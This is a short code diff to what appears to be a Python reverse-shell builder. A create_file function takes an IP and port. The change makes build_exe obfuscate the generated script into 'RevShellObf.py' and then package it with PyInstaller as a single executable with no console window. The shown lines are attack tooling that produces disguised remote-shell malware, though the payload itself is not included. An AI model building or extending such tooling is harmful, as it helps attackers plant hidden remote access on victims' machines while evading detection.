@@ -17,7 +17,9 @@ def create_file(ip, port, filename):
 
 def build_exe(filename):
     # Build the executable file using PyInstaller
-    cmd = f"pyinstaller --onefile --noconsole {filename}"
+    cmd = f"python3 compress.py {filename} RevShellObf.py"
+    subprocess.call(cmd, shell=True)	
+    cmd = f"pyinstaller --onefile --noconsole RevShellObf.py"
     subprocess.call(cmd, shell=True)
 
 if __name__ == '__main__':
@@ -31,4 +33,3 @@ if __name__ == '__main__':
     
     # Build the executable file using PyInstaller
     build_exe(filename)
-
